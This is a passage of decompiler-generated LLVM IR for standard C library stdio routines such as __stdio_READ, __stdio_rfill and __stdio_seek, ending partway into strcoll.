  %v5_805392b = inttoptr i32 %v2_8053925.pre-phi to i32*
  %v6_805392b = call i32 @__stdio_seek(i32 %v0_805392a, i32* %v5_805392b, i32 %v0_8053924, i32 %v0_8053923)
  store i32 %v6_805392b, i32* %eax.global-to-local, align 4
  %v2_8053933 = icmp slt i32 %v6_805392b, 0
  br i1 %v2_8053933, label %dec_label_pc_805395d, label %dec_label_pc_8053937

dec_label_pc_8053937:                             ; preds = %dec_label_pc_8053923
  %v0_8053937 = load i32, i32* @esi, align 4
  %v1_8053937 = inttoptr i32 %v0_8053937 to i32*
  %v2_8053937 = load i32, i32* %v1_8053937, align 4
  store i32 %v2_8053937, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805393b = add i32 %v0_8053937, 44
  %v2_805393b = inttoptr i32 %v1_805393b to i32*
  store i32 0, i32* %v2_805393b, align 4
  %v0_8053942 = load i32, i32* @esi, align 4
  %v1_8053942 = add i32 %v0_8053942, 2
  %v2_8053942 = inttoptr i32 %v1_8053942 to i8*
  store i8 0, i8* %v2_8053942, align 1
  %v0_8053946 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053946 = and i32 %v0_8053946, -72
  store i32 %v1_8053946, i32* %eax.global-to-local, align 4
  %v1_8053949 = trunc i32 %v1_8053946 to i16
  %v2_8053949 = load i32, i32* @esi, align 4
  %v3_8053949 = inttoptr i32 %v2_8053949 to i16*
  store i16 %v1_8053949, i16* %v3_8053949, align 2
  %v0_805394c = load i32, i32* @esi, align 4
  %v1_805394c = add i32 %v0_805394c, 8
  %v2_805394c = inttoptr i32 %v1_805394c to i32*
  %v3_805394c = load i32, i32* %v2_805394c, align 4
  store i32 %v3_805394c, i32* %eax.global-to-local, align 4
  %v2_805394f = add i32 %v0_805394c, 16
  %v3_805394f = inttoptr i32 %v2_805394f to i32*
  store i32 %v3_805394c, i32* %v3_805394f, align 4
  %v0_8053952 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053952 = load i32, i32* @esi, align 4
  %v2_8053952 = add i32 %v1_8053952, 20
  %v3_8053952 = inttoptr i32 %v2_8053952 to i32*
  store i32 %v0_8053952, i32* %v3_8053952, align 4
  %v0_8053955 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053955 = load i32, i32* @esi, align 4
  %v2_8053955 = add i32 %v1_8053955, 24
  %v3_8053955 = inttoptr i32 %v2_8053955 to i32*
  store i32 %v0_8053955, i32* %v3_8053955, align 4
  %v0_8053958 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053958 = load i32, i32* @esi, align 4
  %v2_8053958 = add i32 %v1_8053958, 28
  %v3_8053958 = inttoptr i32 %v2_8053958 to i32*
  store i32 %v0_8053958, i32* %v3_8053958, align 4
  br label %dec_label_pc_8053960

dec_label_pc_805395d:                             ; preds = %dec_label_pc_8053923, %dec_label_pc_805390f, %dec_label_pc_80538fa
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053960

dec_label_pc_8053960:                             ; preds = %dec_label_pc_8053937, %dec_label_pc_805395d
  br i1 %v1_80538d4, label %dec_label_pc_8053975, label %dec_label_pc_8053964

dec_label_pc_8053964:                             ; preds = %dec_label_pc_8053960
  %v2_8053968 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8053968, i32* @eax, align 4
  %v3_805396d = call i32 @__pthread_return_void(i32 %v2_8053968, i32 1)
  store i32 %v3_805396d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053975

dec_label_pc_8053975:                             ; preds = %dec_label_pc_8053960, %dec_label_pc_80538bc, %dec_label_pc_8053964
  %v0_8053978 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053978, i32* %eax.global-to-local, align 4
  store i32 %v0_805389b, i32* @ebx, align 4
  store i32 %v0_805389a, i32* @esi, align 4
  store i32 %v0_8053899, i32* @edi, align 4
  store i32 %v0_8053898, i32* @ebp, align 4
  ret i32 %v0_8053978

; uselistorder directives
  uselistorder i32 %v2_8053925.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805390a, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 64, { 1, 4, 5, 6, 2, 3, 0 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 4, 3, 18, 17, 16, 15, 14, 5, 27, 33, 32, 12, 1, 0, 2, 8, 31, 7, 13, 21, 20, 19, 23, 22, 30, 11, 29, 6, 10, 9, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 45, 2, 1, 0, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 4, 3, 47, 46, 59, 58, 57, 56, 16, 15, 8, 7, 55, 54, 6, 5, 18, 17, 34, 33, 32, 31, 30, 29, 38, 37, 36, 35, 53, 52, 14, 13, 51, 50, 12, 11, 10, 9, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134552291, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 23, 14, 15, 16, 17, 24, 25, 26, 18, 19 }
  uselistorder i32 52, { 7, 0, 12, 1, 2, 3, 4, 13, 14, 5, 10, 6, 8, 15, 11, 9 }
  uselistorder i32 22, { 8, 14, 2, 3, 4, 5, 6, 13, 12, 9, 10, 11, 15, 7, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053975, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053960, { 1, 0 }
  uselistorder label %dec_label_pc_8053923, { 1, 0 }
  uselistorder label %dec_label_pc_80538f5, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053980 = load i32, i32* @ebx, align 4
  store i32 %v0_8053980, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_8053986 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053986, i32* @ebx, align 4
  %v1_805398e = bitcast i16* %arg1 to i8*
  %v2_805398e = load i8, i8* %v1_805398e, align 1
  %v3_805398e = and i8 %v2_805398e, 4
  %v4_805398e = icmp eq i8 %v3_805398e, 0
  %v1_8053991 = icmp eq i1 %v4_805398e, false
  br i1 %v1_8053991, label %dec_label_pc_80539c9, label %dec_label_pc_8053993

dec_label_pc_8053993:                             ; preds = %entry
  %v2_8053993 = icmp slt i32 %arg3, 0
  %v3_805399a = select i1 %v2_8053993, i32 2147483647, i32 %arg3
  %v1_80539a3 = add i32 %v4_8053986, 4
  %v2_80539a3 = inttoptr i32 %v1_80539a3 to i32*
  %v3_80539a3 = load i32, i32* %v2_80539a3, align 4
  %v3_80539a6 = inttoptr i32 %arg2 to i32*
  %v4_80539a6 = call i32 @__libc_read(i32 %v3_80539a3, i32* %v3_80539a6, i32 %v3_805399a)
  store i32 %v4_80539a6, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v4_80539a6, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_80539c9, label %dec_label_pc_80539b5

dec_label_pc_80539b5:                             ; preds = %dec_label_pc_8053993
  %v1_80539ae = icmp eq i32 %v4_80539a6, 0
  %v4_80539b3 = icmp eq i1 %v1_80539ae, false
  %v0_80539b5 = load i32, i32* @ebx, align 4
  %v1_80539b5 = inttoptr i32 %v0_80539b5 to i32*
  %v2_80539b5 = load i32, i32* %v1_80539b5, align 4
  br i1 %v4_80539b3, label %dec_label_pc_80539c1, label %dec_label_pc_80539b9

dec_label_pc_80539b9:                             ; preds = %dec_label_pc_80539b5
  %v1_80539b9 = or i32 %v2_80539b5, 4
  %v1_80539bc = trunc i32 %v1_80539b9 to i16
  %v3_80539bc = inttoptr i32 %v0_80539b5 to i16*
  store i16 %v1_80539bc, i16* %v3_80539bc, align 2
  br label %dec_label_pc_80539c9

dec_label_pc_80539c1:                             ; preds = %dec_label_pc_80539b5
  %v1_80539c1 = or i32 %v2_80539b5, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_80539c6 = trunc i32 %v1_80539c1 to i16
  %v3_80539c6 = inttoptr i32 %v0_80539b5 to i16*
  store i16 %v1_80539c6, i16* %v3_80539c6, align 2
  br label %dec_label_pc_80539c9

dec_label_pc_80539c9:                             ; preds = %dec_label_pc_8053993, %entry, %dec_label_pc_80539b9, %dec_label_pc_80539c1
  %v0_80539ca = load i32, i32* %ecx.global-to-local, align 4
  %v2_80539cd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80539cd, i32* @ebx, align 4
  ret i32 %v0_80539ca

; uselistorder directives
  uselistorder i32 %v4_80539a6, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_read, { 1, 0, 2 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80539c9, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_80539d8 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80539d8, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80539e0 = load i16, i16* %arg1, align 2
  %v3_80539e0 = zext i16 %v2_80539e0 to i32
  store i32 %v3_80539e0, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_80539e0, 4
  %v1_80539e5 = zext i16 %tmp to i32
  %v2_80539e5 = icmp eq i16 %tmp, 0
  br i1 %v2_80539e5, label %dec_label_pc_8053a14, label %dec_label_pc_80539ea

dec_label_pc_80539ea:                             ; preds = %entry
  %v1_80539ec = add nsw i32 %v1_80539e5, -1
  %v8_80539ec = icmp eq i32 %v1_80539ec, 0
  store i32 %v1_80539ec, i32* @edx, align 4
  br i1 %v8_80539ec, label %dec_label_pc_8053a14, label %dec_label_pc_80539ef

dec_label_pc_80539ef:                             ; preds = %dec_label_pc_80539ea
  %v3_80539ef = and i32 %v3_80539e0, 2048
  %v4_80539ef = icmp eq i32 %v3_80539ef, 0
  br i1 %v4_80539ef, label %dec_label_pc_8053a14, label %dec_label_pc_80539f4

dec_label_pc_80539f4:                             ; preds = %dec_label_pc_80539ef
  %v6_80539f4 = sub nsw i32 1, %v1_80539e5
  %v7_80539f4 = and i32 %v1_80539ec, %v6_80539f4
  %v8_80539f4 = icmp slt i32 %v7_80539f4, 0
  %v9_80539f4 = icmp eq i16 %tmp, 2
  %v10_80539f4 = icmp ult i16 %tmp, 2
  %v3_80539f7 = icmp eq i1 %v10_80539f4, %v8_80539f4
  %v4_80539f7 = icmp eq i1 %v9_80539f4, false
  %v5_80539f7 = and i1 %v4_80539f7, %v3_80539f7
  br i1 %v5_80539f7, label %dec_label_pc_8053a68, label %dec_label_pc_80539f9

dec_label_pc_80539f9:                             ; preds = %dec_label_pc_80539f4
  %v1_80539f9 = add i32 %v4_80539d8, 40
  %v2_80539f9 = inttoptr i32 %v1_80539f9 to i32*
  %v3_80539f9 = load i32, i32* %v2_80539f9, align 4
  %v4_80539f9 = icmp eq i32 %v3_80539f9, 0
  %v1_80539fd = icmp eq i1 %v4_80539f9, false
  br i1 %v1_80539fd, label %dec_label_pc_8053a68, label %dec_label_pc_80539ff

dec_label_pc_80539ff:                             ; preds = %dec_label_pc_80539f9
  %v1_80539ff = add i32 %v4_80539d8, 3
  %v2_80539ff = inttoptr i32 %v1_80539ff to i8*
  %v3_80539ff = load i8, i8* %v2_80539ff, align 1
  %v4_80539ff = zext i8 %v3_80539ff to i32
  %v2_8053a03 = sub nsw i32 %v1_80539ec, %v4_80539ff
  %v1_8053a05 = add i32 %v4_80539d8, 44
  %v2_8053a05 = inttoptr i32 %v1_8053a05 to i32*
  %v3_8053a05 = load i32, i32* %v2_8053a05, align 4
  %v1_8053a09 = add nsw i32 %v2_8053a03, -1
  %tmp11 = icmp slt i32 %v3_8053a05, 1
  br i1 %tmp11, label %dec_label_pc_8053a14, label %dec_label_pc_8053a0e

dec_label_pc_8053a0e:                             ; preds = %dec_label_pc_80539ff
  %v1_8053a0e = add i32 %v4_80539d8, 2
  %v2_8053a0e = inttoptr i32 %v1_8053a0e to i8*
  %v3_8053a0e = load i8, i8* %v2_8053a0e, align 1
  %v4_8053a0e = zext i8 %v3_8053a0e to i32
  %v2_8053a12 = sub nsw i32 %v1_8053a09, %v4_8053a0e
  br label %dec_label_pc_8053a14

dec_label_pc_8053a14:                             ; preds = %dec_label_pc_80539ff, %dec_label_pc_80539ef, %dec_label_pc_80539ea, %entry, %dec_label_pc_8053a0e
  %v0_8053a29 = phi i32 [ %v1_8053a09, %dec_label_pc_80539ff ], [ %v1_80539ec, %dec_label_pc_80539ef ], [ 0, %dec_label_pc_80539ea ], [ 0, %entry ], [ %v2_8053a12, %dec_label_pc_8053a0e ]
  %v2_8053a14 = and i32 %v3_80539e0, 64
  %v3_8053a14 = icmp eq i32 %v2_8053a14, 0
  %storemerge.in.in.v = select i1 %v3_8053a14, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_80539d8
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8053a21 = add i32 %v4_80539d8, 16
  %v3_8053a21 = inttoptr i32 %v2_8053a21 to i32*
  %v4_8053a21 = load i32, i32* %v3_8053a21, align 4
  %v5_8053a21 = sub i32 %storemerge, %v4_8053a21
  %v1_8053a24 = inttoptr i32 %arg2 to i32*
  %v2_8053a24 = load i32, i32* %v1_8053a24, align 4
  store i32 %v2_8053a24, i32* %ecx.global-to-local, align 4
  %v1_8053a26 = add i32 %arg2, 4
  %v2_8053a26 = inttoptr i32 %v1_8053a26 to i32*
  %v3_8053a26 = load i32, i32* %v2_8053a26, align 4
  store i32 %v3_8053a26, i32* %ebx.global-to-local, align 4
  %v2_8053a29 = add i32 %v5_8053a21, %v0_8053a29
  store i32 %v2_8053a29, i32* %esi.global-to-local, align 4
  %v5_8053a3d = sub i32 %v2_8053a24, %v2_8053a29
  %v10_8053a3d = icmp ult i32 %v2_8053a24, %v2_8053a29
  %v6_8053a41 = zext i1 %v10_8053a3d to i32
  %tmp13 = icmp slt i32 %v2_8053a29, 0
  %v2_8053a2e.neg = zext i1 %tmp13 to i32
  %v7_8053a41 = add i32 %v3_8053a26, %v2_8053a2e.neg
  %v8_8053a41 = add i32 %v7_8053a41, %v6_8053a41
  store i32 %v8_8053a41, i32* @edx, align 4
  store i32 %v5_8053a3d, i32* %v1_8053a24, align 4
  %v0_8053a47 = load i32, i32* @edx, align 4
  %v1_8053a47 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053a47 = add i32 %v1_8053a47, 4
  %v3_8053a47 = inttoptr i32 %v2_8053a47 to i32*
  store i32 %v0_8053a47, i32* %v3_8053a47, align 4
  %v0_8053a4a = load i32, i32* %edi.global-to-local, align 4
  %v1_8053a4a = add i32 %v0_8053a4a, 4
  %v2_8053a4a = inttoptr i32 %v1_8053a4a to i32*
  %v3_8053a4a = load i32, i32* %v2_8053a4a, align 4
  %v4_8053a4a = load i32, i32* %ebx.global-to-local, align 4
  %v5_8053a4d = icmp slt i32 %v3_8053a4a, %v4_8053a4a
  br i1 %v5_8053a4d, label %dec_label_pc_8053a57, label %dec_label_pc_8053a4f

dec_label_pc_8053a4f:                             ; preds = %dec_label_pc_8053a14
  %v8_8053a4f = icmp sgt i32 %v3_8053a4a, %v4_8053a4a
  br i1 %v8_8053a4f, label %dec_label_pc_8053a55, label %dec_label_pc_8053a51

dec_label_pc_8053a51:                             ; preds = %dec_label_pc_8053a4f
  %v1_8053a51 = inttoptr i32 %v0_8053a4a to i32*
  %v2_8053a51 = load i32, i32* %v1_8053a51, align 4
  %v3_8053a51 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8053a51, %v3_8053a51
  br i1 %tmp14, label %dec_label_pc_8053a55, label %dec_label_pc_8053a57

dec_label_pc_8053a55:                             ; preds = %dec_label_pc_8053a51, %dec_label_pc_8053a4f
  %v0_8053a55 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053a55 = sub i32 0, %v0_8053a55
  store i32 %v1_8053a55, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053a57

dec_label_pc_8053a57:                             ; preds = %dec_label_pc_8053a51, %dec_label_pc_8053a14, %dec_label_pc_8053a55
  %v0_8053a57 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053a57 = icmp slt i32 %v0_8053a57, 0
  %v1_8053a59 = icmp eq i1 %v2_8053a57, false
  br i1 %v1_8053a59, label %dec_label_pc_8053a6b, label %dec_label_pc_8053a5b

dec_label_pc_8053a5b:                             ; preds = %dec_label_pc_8053a57
  %v1_8053a5b = call i32 @__errno_location(i32 %v2_8053a29)
  %v1_8053a60 = inttoptr i32 %v1_8053a5b to i32*
  store i32 75, i32* %v1_8053a60, align 4
  %v0_8053a6e.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053a6b

dec_label_pc_8053a68:                             ; preds = %dec_label_pc_80539f9, %dec_label_pc_80539f4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053a6b

dec_label_pc_8053a6b:                             ; preds = %dec_label_pc_8053a57, %dec_label_pc_8053a5b, %dec_label_pc_8053a68
  %v0_8053a6e = phi i32 [ %v0_8053a57, %dec_label_pc_8053a57 ], [ %v0_8053a6e.pre, %dec_label_pc_8053a5b ], [ -1, %dec_label_pc_8053a68 ]
  ret i32 %v0_8053a6e

; uselistorder directives
  uselistorder i32 %v4_8053a4a, { 1, 0 }
  uselistorder i32 %v3_8053a4a, { 1, 0 }
  uselistorder i32 %v2_8053a29, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_80539ec, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_80539d8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053a6b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053a57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053a14, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8053a74 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8053a7c = add i32 %arg1, 8
  %v2_8053a7c = inttoptr i32 %v1_8053a7c to i32*
  %v3_8053a7c = load i32, i32* %v2_8053a7c, align 4
  store i32 %v3_8053a7c, i32* %edx.global-to-local, align 4
  %v1_8053a7f = add i32 %arg1, 12
  %v2_8053a7f = inttoptr i32 %v1_8053a7f to i32*
  %v3_8053a7f = load i32, i32* %v2_8053a7f, align 4
  %v2_8053a82 = sub i32 %v3_8053a7f, %v3_8053a7c
  %v3_8053a87 = inttoptr i32 %arg1 to i16*
  %v4_8053a87 = call i32 @__stdio_READ(i16* %v3_8053a87, i32 %v3_8053a7c, i32 %v2_8053a82)
  %v0_8053a8c = load i32, i32* @ebx, align 4
  %v1_8053a8c = add i32 %v0_8053a8c, 8
  %v2_8053a8c = inttoptr i32 %v1_8053a8c to i32*
  %v3_8053a8c = load i32, i32* %v2_8053a8c, align 4
  store i32 %v3_8053a8c, i32* %edx.global-to-local, align 4
  %v2_8053a8f = add i32 %v0_8053a8c, 16
  %v3_8053a8f = inttoptr i32 %v2_8053a8f to i32*
  store i32 %v3_8053a8c, i32* %v3_8053a8f, align 4
  %v0_8053a92 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053a92 = add i32 %v0_8053a92, %v4_8053a87
  store i32 %v2_8053a92, i32* %edx.global-to-local, align 4
  %v1_8053a94 = load i32, i32* @ebx, align 4
  %v2_8053a94 = add i32 %v1_8053a94, 20
  %v3_8053a94 = inttoptr i32 %v2_8053a94 to i32*
  store i32 %v2_8053a92, i32* %v3_8053a94, align 4
  store i32 %v0_8053a74, i32* @ebx, align 4
  ret i32 %v4_8053a87

; uselistorder directives
  uselistorder i32 %v4_8053a87, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8053a9c = load i32, i32* @ebx, align 4
  %v4_8053aa0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053aa0, i32* @ebx, align 4
  %v2_8053aa8 = load i16, i16* %arg1, align 2
  %v3_8053aa8 = zext i16 %v2_8053aa8 to i32
  %v2_8053aab = and i32 %v3_8053aa8, %arg2
  %v3_8053aab = icmp eq i32 %v2_8053aab, 0
  %v1_8053aad = icmp eq i1 %v3_8053aab, false
  br i1 %v1_8053aad, label %dec_label_pc_8053abb, label %dec_label_pc_8053aaf

dec_label_pc_8053aaf:                             ; preds = %entry
  %v1_8053aaf = and i32 %v3_8053aa8, 2176
  %v2_8053aaf = icmp eq i32 %v1_8053aaf, 0
  %v1_8053ab4 = icmp eq i1 %v2_8053aaf, false
  br i1 %v1_8053ab4, label %dec_label_pc_8053ac2, label %dec_label_pc_8053ab6

dec_label_pc_8053ab6:                             ; preds = %dec_label_pc_8053aaf
  %v2_8053ab6 = or i32 %v3_8053aa8, %arg2
  %v1_8053ab8 = trunc i32 %v2_8053ab6 to i16
  store i16 %v1_8053ab8, i16* %arg1, align 2
  %v0_8053abb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053abb

dec_label_pc_8053abb:                             ; preds = %entry, %dec_label_pc_8053ab6
  %v0_8053ae1 = phi i32 [ %v4_8053aa0, %entry ], [ %v0_8053abb.pre, %dec_label_pc_8053ab6 ]
  %v1_8053abb = inttoptr i32 %v0_8053ae1 to i16*
  %v2_8053abb = load i16, i16* %v1_8053abb, align 2
  %v2_8053abe = and i16 %v2_8053abb, 16
  %v3_8053abe = icmp eq i16 %v2_8053abe, 0
  br i1 %v3_8053abe, label %dec_label_pc_8053ada, label %dec_label_pc_8053ac2

dec_label_pc_8053ac2:                             ; preds = %dec_label_pc_8053abb, %dec_label_pc_8053aaf
  %v1_8053ac2 = call i32 @__errno_location(i32 %v0_8053a9c)
  %v1_8053ac7 = inttoptr i32 %v1_8053ac2 to i32*
  store i32 9, i32* %v1_8053ac7, align 4
  br label %dec_label_pc_8053acd

dec_label_pc_8053acd:                             ; preds = %dec_label_pc_8053ade, %dec_label_pc_8053ac2
  %v0_8053acd = load i32, i32* @ebx, align 4
  %v1_8053acd = inttoptr i32 %v0_8053acd to i32*
  %v2_8053acd = load i32, i32* %v1_8053acd, align 4
  %v1_8053acf = or i32 %v2_8053acd, 8
  %v1_8053ad2 = trunc i32 %v1_8053acf to i16
  %v3_8053ad2 = inttoptr i32 %v0_8053acd to i16*
  store i16 %v1_8053ad2, i16* %v3_8053ad2, align 2
  br label %dec_label_pc_8053b06

dec_label_pc_8053ada:                             ; preds = %dec_label_pc_8053abb
  %v2_8053ada = and i16 %v2_8053abb, 64
  %v3_8053ada = icmp eq i16 %v2_8053ada, 0
  br i1 %v3_8053ada, label %dec_label_pc_8053afc, label %dec_label_pc_8053ade

dec_label_pc_8053ade:                             ; preds = %dec_label_pc_8053ada
  %v2_8053ae2 = call i32 @__stdio_wcommit(i32 %v0_8053ae1)
  %v1_8053aea = icmp eq i32 %v2_8053ae2, 0
  %v1_8053aec = icmp eq i1 %v1_8053aea, false
  br i1 %v1_8053aec, label %dec_label_pc_8053acd, label %dec_label_pc_8053aee

dec_label_pc_8053aee:                             ; preds = %dec_label_pc_8053ade
  %v0_8053aee = load i32, i32* @ebx, align 4
  %v1_8053aee = add i32 %v0_8053aee, 8
  %v2_8053aee = inttoptr i32 %v1_8053aee to i32*
  %v3_8053aee = load i32, i32* %v2_8053aee, align 4
  %v2_8053af1 = add i32 %v0_8053aee, 28
  %v3_8053af1 = inttoptr i32 %v2_8053af1 to i32*
  store i32 %v3_8053aee, i32* %v3_8053af1, align 4
  %v0_8053af4 = load i32, i32* @ebx, align 4
  %v1_8053af4 = inttoptr i32 %v0_8053af4 to i32*
  %v2_8053af4 = load i32, i32* %v1_8053af4, align 4
  %v2_8053af4.tr = trunc i32 %v2_8053af4 to i16
  %v1_8053af9 = and i16 %v2_8053af4.tr, -65
  %v3_8053af9 = inttoptr i32 %v0_8053af4 to i16*
  store i16 %v1_8053af9, i16* %v3_8053af9, align 2
  %v0_8053afc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053afc

dec_label_pc_8053afc:                             ; preds = %dec_label_pc_8053ada, %dec_label_pc_8053aee
  %v2_8053b01 = phi i32 [ %v0_8053ae1, %dec_label_pc_8053ada ], [ %v0_8053afc.pre, %dec_label_pc_8053aee ]
  %v1_8053afc = inttoptr i32 %v2_8053b01 to i32*
  %v2_8053afc = load i32, i32* %v1_8053afc, align 4
  %v1_8053afe = or i32 %v2_8053afc, 1
  %v1_8053b01 = trunc i32 %v1_8053afe to i16
  %v3_8053b01 = inttoptr i32 %v2_8053b01 to i16*
  store i16 %v1_8053b01, i16* %v3_8053b01, align 2
  br label %dec_label_pc_8053b06

dec_label_pc_8053b06:                             ; preds = %dec_label_pc_8053acd, %dec_label_pc_8053afc
  %storemerge = phi i32 [ 0, %dec_label_pc_8053afc ], [ -1, %dec_label_pc_8053acd ]
  %v2_8053b06 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053b06, i32* @edx, align 4
  store i32 %v0_8053a9c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8053aa8, { 0, 2, 1 }
  uselistorder i32 %v0_8053a9c, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 0, { 0, 8, 2, 1, 9, 6, 10, 7, 11, 12, 13, 14, 15, 16, 17, 3, 4, 5 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053b06, { 1, 0 }
  uselistorder label %dec_label_pc_8053afc, { 1, 0 }
  uselistorder label %dec_label_pc_8053abb, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8053b18 = add i32 %tmp5, 4
  %v2_8053b18 = inttoptr i32 %v1_8053b18 to i32*
  %v3_8053b18 = load i32, i32* %v2_8053b18, align 4
  %v2_8053b1b = load i32, i32* %arg2, align 4
  %v1_8053b21 = add i32 %arg1, 4
  %v2_8053b21 = inttoptr i32 %v1_8053b21 to i32*
  %v3_8053b21 = load i32, i32* %v2_8053b21, align 4
  %v4_8053b24 = call i32 @__libc_lseek64(i32 %v3_8053b21, i32 %v2_8053b1b, i32 %v3_8053b18, i32 %arg3)
  %v0_8053b2c = load i32, i32* @edx, align 4
  %v2_8053b2c = icmp slt i32 %v0_8053b2c, 0
  store i32 %v4_8053b24, i32* %ecx.global-to-local, align 4
  br i1 %v2_8053b2c, label %dec_label_pc_8053b39, label %dec_label_pc_8053b32

dec_label_pc_8053b32:                             ; preds = %entry
  %v1_8053b32 = load i32, i32* @ebx, align 4
  %v2_8053b32 = inttoptr i32 %v1_8053b32 to i32*
  store i32 %v4_8053b24, i32* %v2_8053b32, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8053b36 = load i32, i32* @edx, align 4
  %v1_8053b36 = load i32, i32* @ebx, align 4
  %v2_8053b36 = add i32 %v1_8053b36, 4
  %v3_8053b36 = inttoptr i32 %v2_8053b36 to i32*
  store i32 %v0_8053b36, i32* %v3_8053b36, align 4
  %v0_8053b3a.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053b39

dec_label_pc_8053b39:                             ; preds = %entry, %dec_label_pc_8053b32
  %v0_8053b3a = phi i32 [ %v4_8053b24, %entry ], [ %v0_8053b3a.pre, %dec_label_pc_8053b32 ]
  ret i32 %v0_8053b3a

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8053b39, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8053b42 = ptrtoint i8* %arg1 to i32
  %v4_8053b4a.pre = load i32, i32* @eax, align 4
  %v8_8053b4a.pre = load i1, i1* @df, align 1
  %v9_8053b4a = select i1 %v8_8053b4a.pre, i32 -1, i32 1
  br label %dec_label_pc_8053b4a

dec_label_pc_8053b4a:                             ; preds = %dec_label_pc_8053b4e, %entry
